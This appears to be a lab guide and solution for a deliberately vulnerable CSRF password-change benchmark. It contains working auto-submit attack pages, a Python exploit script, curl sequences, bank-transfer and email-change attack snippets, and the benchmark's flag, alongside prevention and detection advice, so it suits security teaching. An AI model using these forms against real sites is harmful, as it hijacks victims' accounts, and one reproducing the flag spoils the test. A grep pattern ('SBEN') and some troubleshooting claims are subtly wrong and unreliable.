# S7BEN-EASY-001: Manual Testing Guide

## Vulnerability: CSRF - Password Change

### Overview
This benchmark demonstrates a Cross-Site Request Forgery (CSRF) vulnerability where an authenticated user can be tricked into performing actions without their knowledge by visiting a malicious webpage.

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-EASY-001
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Access the Application
Open your browser to: http://localhost:5000

**Default credentials:**
- Username: `admin`
- Password: `admin123`

---

## Understanding CSRF

### What is CSRF?

Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to execute unwanted actions on a web application. The attack works because:

1. User authenticates to a legitimate site (gets session cookie)
2. User visits attacker's malicious site (while still logged in)
3. Malicious site makes requests to the legitimate site
4. Browser automatically includes the session cookie
5. Legitimate site processes the request as if the user intended it

### Requirements for CSRF:
- ✅ User must be authenticated (has valid session)
- ✅ Application uses cookies for authentication
- ✅ No CSRF token validation
- ✅ Predictable request parameters

---

## Manual Testing Steps

### Step 1: Login as Admin
```bash
# Get a session cookie
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=admin&password=admin123" \
  -L
```

### Step 2: Verify Password Change Works
```bash
# Try changing password normally
curl -b cookies.txt -X POST http://localhost:5000/change-password \
  -d "new_password=newpass123&confirm_password=newpass123" \
  -L
```

This should work and change the password.

### Step 3: Reset Password Back
```bash
# Login with new password
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=admin&password=newpass123" \
  -L

# Change back to admin123
curl -b cookies.txt -X POST http://localhost:5000/change-password \
  -d "new_password=admin123&confirm_password=admin123" \
  -L
```

---

## Exploitation

### Method 1: HTML Auto-Submit Form (Most Realistic)

Create a file `csrf_attack.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>You Won a Prize!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .prize {
            background: white;
            color: #333;
            padding: 40px;
            border-radius: 10px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
        }
        h1 { color: #667eea; }
        .loading {
            margin-top: 30px;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="prize">
        <h1>🎉 Congratulations! 🎉</h1>
        <p>You've won a free Strike7 Security Course!</p>
        <p class="loading">Redirecting to claim your prize...</p>
    </div>

    <!-- Hidden CSRF attack form -->
    <iframe name="csrf-frame" style="display: none;"></iframe>

    <form id="csrf-form"
          action="http://localhost:5000/change-password"
          method="POST"
          target="csrf-frame"
          style="display: none;">
        <input type="text" name="new_password" value="hacked">
        <input type="text" name="confirm_password" value="hacked">
    </form>

    <script>
        // Auto-submit the form when page loads
        window.onload = function() {
            // Wait a moment to make it less suspicious
            setTimeout(function() {
                document.getElementById('csrf-form').submit();
                // Redirect to real site after attack
                setTimeout(function() {
                    window.location.href = 'http://localhost:5000/dashboard';
                }, 1000);
            }, 2000);
        };
    </script>
</body>
</html>
```

### Testing the Attack:

1. **Login as admin:**
   ```bash
   # Open browser to http://localhost:5000
   # Login with admin/admin123
   ```

2. **Open the malicious page** (while still logged in):
   ```bash
   # Serve the attack page
   python3 -m http.server 8000
   ```

3. **Visit the attack page:**
   ```
   Open: http://localhost:8000/csrf_attack.html
   ```

4. **Check if attack worked:**
   ```
   Go to: http://localhost:5000/dashboard
   ```

   If successful, you'll see the flag!

### Method 2: Using Python Requests (Simulating CSRF)

Create `exploit.py`:

```python
import requests

URL = "http://localhost:5000"

def exploit_csrf():
    """
    Simulate a CSRF attack by:
    1. Logging in as admin
    2. Using the session to change password (simulating CSRF)
    3. Checking for the flag
    """

    print("="*60)
    print("S7BEN-EASY-001: CSRF Attack Simulation")
    print("="*60)

    # Step 1: Login as admin
    print("\n[*] Step 1: Logging in as admin...")
    session = requests.Session()

    login_response = session.post(
        f"{URL}/login",
        data={
            "username": "admin",
            "password": "admin123"
        }
    )

    if login_response.status_code == 200 and 'dashboard' in login_response.url:
        print("[+] Login successful!")
    else:
        print("[-] Login failed!")
        return False

    # Step 2: Perform CSRF attack (change password to 'hacked')
    print("\n[*] Step 2: Simulating CSRF attack...")
    print("    Changing admin password to 'hacked'...")

    csrf_response = session.post(
        f"{URL}/change-password",
        data={
            "new_password": "hacked",
            "confirm_password": "hacked"
        }
    )

    if 'successfully' in csrf_response.text.lower():
        print("[+] Password changed successfully via CSRF!")
    else:
        print("[-] Password change failed")
        return False

    # Step 3: Check dashboard for flag
    print("\n[*] Step 3: Checking dashboard for flag...")

    dashboard_response = session.get(f"{URL}/dashboard")

    if 'S7BEN{' in dashboard_response.text:
        # Extract flag
        start = dashboard_response.text.find('S7BEN{')
        end = dashboard_response.text.find('}', start) + 1
        flag = dashboard_response.text[start:end]

        print("\n" + "="*60)
        print("SUCCESS! CSRF ATTACK WORKED!")
        print("="*60)
        print(f"\nFLAG: {flag}\n")
        print("="*60)
        return True
    else:
        print("[-] Flag not found on dashboard")
        return False

if __name__ == "__main__":
    exploit_csrf()
```

Run the exploit:
```bash
python3 exploit.py
```

**Expected Output:**
```
============================================================
S7BEN-EASY-001: CSRF Attack Simulation
============================================================

[*] Step 1: Logging in as admin...
[+] Login successful!

[*] Step 2: Simulating CSRF attack...
    Changing admin password to 'hacked'...
[+] Password changed successfully via CSRF!

[*] Step 3: Checking dashboard for flag...

============================================================
SUCCESS! CSRF ATTACK WORKED!
============================================================

FLAG: S7BEN{CSRF_ATT4CK_SUCC3SSFUL}

============================================================
```

### Method 3: Using curl with Session Cookie

```bash
# Step 1: Login and save cookies
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=admin&password=admin123" \
  -L -s > /dev/null

echo "[+] Logged in as admin"

# Step 2: Perform CSRF attack (change password to 'hacked')
curl -b cookies.txt -X POST http://localhost:5000/change-password \
  -d "new_password=hacked&confirm_password=hacked" \
  -L -s > /dev/null

echo "[+] Password changed to 'hacked'"

# Step 3: Check dashboard for flag
RESPONSE=$(curl -b cookies.txt http://localhost:5000/dashboard -s)

if echo "$RESPONSE" | grep -q "S7BEN{"; then
    FLAG=$(echo "$RESPONSE" | grep -oP 'SBEN\{[^}]+\}')
    echo ""
    echo "======================================"
    echo "FLAG: $FLAG"
    echo "======================================"
else
    echo "[-] Flag not found"
fi
```

### Method 4: Image Tag Attack (Simpler but Less Reliable)

Create `csrf_image.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Funny Cat Pictures!</title>
</head>
<body>
    <h1>Loading funny cat pictures...</h1>

    <!-- CSRF via img tag (won't work for POST, but demonstrates concept) -->
    <!-- For demonstration of GET-based CSRF -->

    <!-- Hidden form for POST-based CSRF -->
    <img src="x" onerror="document.getElementById('csrf').submit()">

    <form id="csrf"
          action="http://localhost:5000/change-password"
          method="POST"
          style="display:none">
        <input name="new_password" value="hacked">
        <input name="confirm_password" value="hacked">
    </form>
</body>
</html>
```

---

## Understanding the Vulnerable Code

### The Vulnerability (app.py:175-202)

```python
@app.route('/change-password', methods=['GET', 'POST'])
@login_required
def change_password():
    """
    VULNERABILITY: No CSRF token validation!
    """

    if request.method == 'POST':
        new_password = request.form.get('new_password', '')
        confirm_password = request.form.get('confirm_password', '')

        # ... password validation ...

        # VULNERABILITY: No CSRF token check here!
        # Should check: if request.form.get('csrf_token') != session.get('csrf_token')

        # Change the password
        username = session['username']
        USERS[username] = new_password
```

### What's Missing?

**CSRF Token Generation:**
```python
import secrets

@app.route('/change-password', methods=['GET'])
@login_required
def change_password_form():
    # Generate CSRF token
    csrf_token = secrets.token_hex(32)
    session['csrf_token'] = csrf_token

    return render_template('change_password.html',
                         csrf_token=csrf_token)
```

**CSRF Token Validation:**
```python
@app.route('/change-password', methods=['POST'])
@login_required
def change_password_submit():
    # Validate CSRF token
    submitted_token = request.form.get('csrf_token')
    session_token = session.get('csrf_token')

    if not submitted_token or submitted_token != session_token:
        return "CSRF token invalid", 403

    # Process password change...
```

**Form with CSRF Token:**
```html
<form method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <input type="password" name="new_password">
    <button type="submit">Change Password</button>
</form>
```

---

## Real-World CSRF Examples

### Example 1: Bank Transfer
```html
<!-- Attacker's page -->
<form id="transfer" action="https://bank.com/transfer" method="POST">
    <input name="to_account" value="attacker123">
    <input name="amount" value="10000">
</form>
<script>document.getElementById('transfer').submit();</script>
```

### Example 2: Email Change
```html
<img src="https://example.com/change-email?new_email=attacker@evil.com">
```

### Example 3: Account Deletion
```html
<form action="https://social.com/delete-account" method="POST">
    <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit();</script>
```

---

## CSRF Prevention Techniques

### 1. **CSRF Tokens (Recommended)**
- Generate unique token per session
- Include in all forms
- Validate on server side

### 2. **SameSite Cookies**
```python
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
```

### 3. **Double Submit Cookie**
- Send CSRF token in both cookie and form
- Compare on server side

### 4. **Custom Headers**
```javascript
// AJAX requests with custom header
fetch('/api/change-password', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': csrf_token,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({password: 'new'})
});
```

### 5. **Referer Validation**
```python
referer = request.headers.get('Referer', '')
if not referer.startswith('https://yourdomain.com'):
    return "Invalid referer", 403
```

---

## Testing with Different Scenarios

### Scenario 1: Cross-Origin Attack
The attack page is hosted on a different domain (port):
```bash
# Terminal 1: Run the app
make up

# Terminal 2: Serve attack page
cd /tmp
echo '<form id="f" action="http://localhost:5000/change-password" method="POST">
<input name="new_password" value="hacked">
<input name="confirm_password" value="hacked">
</form><script>document.getElementById("f").submit()</script>' > attack.html

python3 -m http.server 8888

# Browser: Login to localhost:5000, then visit localhost:8888/attack.html
```

### Scenario 2: JSON-based CSRF (Won't Work by Default)
```bash
# This won't work because application/json doesn't include cookies by default
curl -X POST http://localhost:5000/change-password \
  -H "Content-Type: application/json" \
  -d '{"new_password":"hacked","confirm_password":"hacked"}'
```

---

## Troubleshooting

### Issue: Attack not working
**Solutions:**
1. Make sure you're logged in first
2. Check that session cookie is not HttpOnly-flagged
3. Verify the form action URL is correct
4. Check browser console for errors

### Issue: "Session expired"
**Solution:** Login again before testing the CSRF attack

### Issue: Flag not appearing
**Solution:** Ensure the password was actually changed to exactly `hacked` (lowercase)

### Issue: Cross-origin blocked
**Solution:** For this demo, CORS should allow it. If blocked, serve attack page from same origin

---

## Detection and Monitoring

### Signs of CSRF Attacks:
- Unexpected Referer headers (or missing)
- Unusual user-agent strings
- Rapid state changes
- Actions from suspicious IPs

### Log Analysis:
```bash
# Look for password changes without proper referer
grep "change-password" /var/log/app.log | grep -v "Referer: http://localhost:5000"
```

---

## Cleanup

```bash
make down
make clean
rm -f cookies.txt csrf_attack.html exploit.py
```

---

## Success Criteria

- Successfully logged in as admin with password `admin123`
- Created CSRF attack page/script
- Changed admin password to `hacked` via CSRF
- Retrieved flag from dashboard: `S7BEN{CSRF_ATT4CK_SUCC3SSFUL}`
